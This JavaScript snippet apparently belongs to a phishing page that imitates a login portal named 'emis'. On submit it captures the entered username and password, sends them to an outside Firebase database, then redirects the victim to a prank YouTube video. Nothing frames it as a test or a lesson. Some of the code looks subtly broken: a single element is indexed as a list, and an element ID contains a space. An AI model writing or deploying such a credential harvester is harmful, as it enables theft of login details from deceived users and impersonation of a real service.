const userInput = document.querySelector("input")
const submitButton = document.getElementById("button login__submit")

const submitFormHandler = async (event) => {
    event.preventDefault();

    let username = userInput[0].value;
    let password = userInput[1].value;

    await fetch("https://emis-clone-default-rtdb.europe-west1.firebasedatabase.app/", {
        method: "POST",
        body: JSON.stringify({username, password}),
        headers: {"Content-type": "application/json"},
    })

    window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

};

submitButton.addEventListener('click', submitFormHandler);